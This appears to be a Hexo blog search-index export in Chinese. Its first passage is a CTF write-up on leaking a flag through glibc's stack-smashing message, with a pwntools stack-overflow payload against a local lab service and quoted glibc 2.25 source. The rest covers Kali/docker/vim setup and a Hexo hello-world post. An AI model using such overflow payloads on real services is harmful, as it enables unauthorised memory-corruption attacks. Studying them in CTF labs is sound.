所以需要利用第二次的写入将LIBC_FATAL_STDERR_=1写入到环境变量中，这样自己的终端才可以接收到flag payload： 12345678910from pwn import *io = remote("172.17.0.2", 10001)payload_1 = "A"*0x218 + p64(0x400d20)+p64(0)+p64(0x600d20) #p64(0)是argv[0]指针与环境变量之间的隔断。 #p64(0x600d20)是第二次输出写入环境变量的指针io.sendline(payload_1)payload_2 = "LIBC_FATAL_STDERR_=1"io.sendline(payload_2)print io.recvall() Libc 2.25然而在2.25中调用的函数有所改变 123456789//stack_chk_fail.cextern char **__libc_argv attribute_hidden;void__attribute__ ((noreturn))__stack_chk_fail (void)&#123; __fortify_fail_abort (false, "stack smashing detected");&#125;strong_alias (__stack_chk_fail, __stack_chk_fail_local) 这里面调用了__fortify_fail_abort 而不是__fortify_fail 1234567891011121314151617181920212223242526extern char **__libc_argv attribute_hidden;void__attribute__ ((noreturn))__fortify_fail_abort (_Bool need_backtrace, const char *msg)&#123; /* The loop is added only to keep gcc happy. Don't pass down __libc_argv[0] if we aren't doing backtrace since __libc_argv[0] may point to the corrupted stack. */ while (1) __libc_message (need_backtrace ? (do_abort | do_backtrace) : do_abort, "*** %s ***: %s terminated\n", msg, (need_backtrace &amp;&amp; __libc_argv[0] != NULL ? __libc_argv[0] : "&lt;unknown&gt;"));&#125;void__attribute__ ((noreturn))__fortify_fail (const char *msg)&#123; __fortify_fail_abort (true, msg);&#125;libc_hidden_def (__fortify_fail)libc_hidden_def (__fortify_fail_abort) 函数 __fortify_fail_abort() 在第一个参数为 false 时不再进行栈回溯，直接以打印出字符串 &lt;unknown&gt; 结束，也就没有办法输出 argv[0] 了。]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搭建环境]]></title>
    <url>%2F2019%2F05%2F30%2F%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83%2F</url>
    <content type="text"><![CDATA[kali配置安装docker正常情况下用docker官方的文档安装就行，但是执行到下面这条命令时会报错 1234$ sudo add-apt-repository \ "deb [arch=amd64] https://download.docker.com/linux/ubuntu \ $(lsb_release -cs) \ stable" 错误： 1aptsources.distro.NoDistroTemplateException: Error: could not find a distribution template for Kali/n/a 具体原因是什么至今也没查到，可能是和kali版本有关系吧 解决方法：自己添加源就可以了 1deb https://mirrors.aliyun.com/docker-ce/linux/debian wheezy stable 安装成功后执行systemctl enable docker使docker开机自启。 再找一个合适的环境pull下，找了半天发现pwnbox不错，有一个run.sh可以快捷启动环境，但是没有ida调试文件和没有端口映射，自己改了改文件之后就好用多了。 run.sh: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#!/usr/bin/env bash# Run superkojiman/pwnbox container in docker.# Store your .gdbinit, .radare2rc, .vimrc, etc in a ./rc directory. The contents will be copied to# /root/ in the container.ESC="\x1B["RESET=$ESC"39m"RED=$ESC"31m"GREEN=$ESC"32m"BLUE=$ESC"34m"if [[ -z $&#123;1&#125; ]]; then echo -e "$&#123;RED&#125;Missing argument CTF name.$&#123;RESET&#125;" exit 0fictf_name=$&#123;1&#125;# Create docker container and run in the background# Add this if you need to modify anything in /proc: --privileged docker run -it \ -h $&#123;ctf_name&#125; \ -d \ -p 23946:23946 \ --security-opt seccomp:unconfined \ --name $&#123;ctf_name&#125; \ superkojiman/pwnbox# Tar config files in rc and extract it into the containerif [[ -d rc ]]; then cd rc if [[ -f rc.tar ]]; then rm -f rc.tar fi for i in .*; do if [[ ! $&#123;i&#125; == "." &amp;&amp; ! $&#123;i&#125; == ".." ]]; then tar rf rc.tar $&#123;i&#125; fi done cd - &gt; /dev/null 2&gt;&amp;1 cat rc/rc.tar | docker cp - $&#123;ctf_name&#125;:/root/ rm -f rc/rc.tarelse echo -e "$&#123;RED&#125;No rc directory found. Nothing to copy to container.$&#123;RESET&#125;"fi# Create stop/rm script for containercat &lt;&lt; EOF &gt; $&#123;ctf_name&#125;-stop.sh#!/bin/bashdocker stop $&#123;ctf_name&#125;docker rm $&#123;ctf_name&#125;rm -f $&#123;ctf_name&#125;-stop.shEOFchmod 755 $&#123;ctf_name&#125;-stop.sh# Create a workdir for this CTFdocker exec $&#123;ctf_name&#125; mkdir /root/workdocker cp linux_server $&#123;ctf_name&#125;:/root/workdocker cp linux_server64 $&#123;ctf_name&#125;:/root/work# Get a shellecho -e "$&#123;GREEN&#125; ______ $&#123;RESET&#125;"echo -e "$&#123;GREEN&#125;___________ ___________ /___________ __$&#123;RESET&#125;"echo -e "$&#123;GREEN&#125;___ __ \\_ | /| / /_ __ \\_ __ \\ __ \\_ |/_/$&#123;RESET&#125;"echo -e "$&#123;GREEN&#125;__ /_/ /_ |/ |/ /_ / / / /_/ / /_/ /_&gt; &lt; $&#123;RESET&#125;"echo -e "$&#123;GREEN&#125;_ .___/____/|__/ /_/ /_//_.___/\\____//_/|_| $&#123;RESET&#125;"echo -e "$&#123;GREEN&#125;/_/ by superkojiman $&#123;RESET&#125;"echo ""docker attach $&#123;ctf_name&#125; 需要同目录下有linux_server和linux_server64文件(在ida安装目录下的dbgsrv里面)。 接下来对本机vim进行配置，安装YouCompleteMe和一些缩进的配置。 .vimrc: 123456789101112131415161718192021222324set nocompatibleset rtp+=~/.vim/plugged/set numberset t_Co=256syntax onset autoindentset smartindentset tabstop=4set shiftwidth=4"themecolorscheme molokai"YouCompleteMelet g:ycm_global_ycm_extra_conf = '~/.ycm_extra_conf.py'let g:ycm_min_num_of_chars_for_completion=1let g:ycm_warning_symbol='&gt;*'let g:ycm_error_symbol='&gt;&gt;'call plug#begin('~/.vim/plugged')Plug 'Valloric/YouCompleteMe'call plug#end() YouCompleteMe clone到vim里面后，还需要进去编译一下，执行 123sudo apt install build-essential cmake python3-devcd ~/.vim/plugged/YouCompleteMepython3 install.py --clang-completer 到此为止就差不多够用了]]></content>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F05%2F30%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
